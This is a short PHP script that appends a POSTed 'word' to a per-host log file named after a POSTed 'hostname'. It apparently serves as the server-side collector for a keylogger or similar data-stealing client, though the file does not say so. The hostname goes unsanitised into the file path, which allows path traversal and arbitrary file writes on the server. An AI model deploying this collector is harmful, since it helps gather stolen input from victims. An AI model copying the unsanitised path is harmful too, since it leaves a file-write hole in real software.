<?php

isset($_POST['word'])? $key = $_POST['word'] : '';
if(isset($_POST['hostname'])){
	$filename = 'logs/' . $_POST['hostname'] . '.txt';
	$file = fopen($filename, 'a');
	fwrite($file, $key);
} 
else {
	echo '<code> { <br> &nbsp "error" : "You didn\'t pass any parameters!" <br> } </code>';
}


?>